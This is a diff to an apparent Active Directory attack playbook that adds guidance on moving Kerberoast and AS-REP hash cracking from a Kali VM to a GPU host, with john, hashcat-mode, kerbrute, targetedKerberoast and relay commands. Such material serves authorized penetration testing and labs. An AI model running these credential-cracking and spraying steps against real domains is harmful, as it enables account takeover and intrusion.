@@ -40,6 +40,28 @@ john --format=krb5tgs    --wordlist=/usr/share/wordlists/rockyou.txt kerb.txt
 john --show --format=krb5asrep asrep.txt
 ```
 
+## Crack on the HOST, not the Kali VM
+
+The attack VM is the wrong place to crack: headless Kali has no GPU runtime, so
+hashcat dies and john grinds rockyou at CPU speed. Both live runs lost time here
+(`.refinements/1.md` dead-ended on AS-REP). The host (an Apple-Silicon Mac with
+hashcat's Metal backend, or any real GPU) is far faster. `ad-auto.py` time-boxes
+its on-box crack to `ADTK_CRACK_BUDGET` (default 90s) and then hands you the
+offload command — don't let a hopeless wordlist block the chain.
+
+```
+# capture on Kali (ad-auto / GetUserSPNs write logs/<dc>/hashes/kerb.txt),
+# pull it to the host (MCP logs_read, or scp), then on the HOST:
+ADTK_WORDLIST=~/wordlists/rockyou.txt \
+  scripts/host-crack.sh --mode 13100 --hash ./kerb.txt --budget 300 --background
+# prints user:pass, writes ./kerb.txt.cracked. Keep enumerating (BloodHound /
+# ACL / ADCS) while it runs, then feed the cred back to the chain.
+```
+
+`host-crack.sh` tries hashcat (Metal/OpenCL) first, falls back to john, and does
+not download rockyou — point `--wordlist` / `ADTK_WORDLIST` at one. Modes:
+18200 AS-REP, 13100 TGS-RC4, 19600/19700 TGS-AES, 5600 NetNTLMv2, 1000 NTLM.
+
 kerbrute (quieter than SMB spray; still lockout-capable):
 
 ```
@@ -68,7 +90,8 @@ targetedKerberoast.py -d {{DOMAIN}} -u {{USER}} -p '{{PASS}}' --dc-ip {{DC}} \
 
 | Symptom | Next |
 | --- | --- |
-| `No OpenCL, HIP or CUDA compatible platform found` (VM/container) | use `john` (CPU) — default in a headless box. `hashcat -D 1` is slower |
+| `No OpenCL, HIP or CUDA compatible platform found` (VM/container) | crack on the HOST (`host-crack.sh`, Metal/GPU), else `john` (CPU) |
+| on-box crack hit the `ADTK_CRACK_BUDGET` and stopped | expected — pull the hash to the host and run `host-crack.sh --background`, keep enumerating |
 | no GPU / `clGetPlatformIDs` | john, or `-D 1` (CPU). labs do not need a 4090 |
 | AES TGS, 13100 empty | 19700/19600 |
 | 5600 not cracking | relay the next handshake instead |
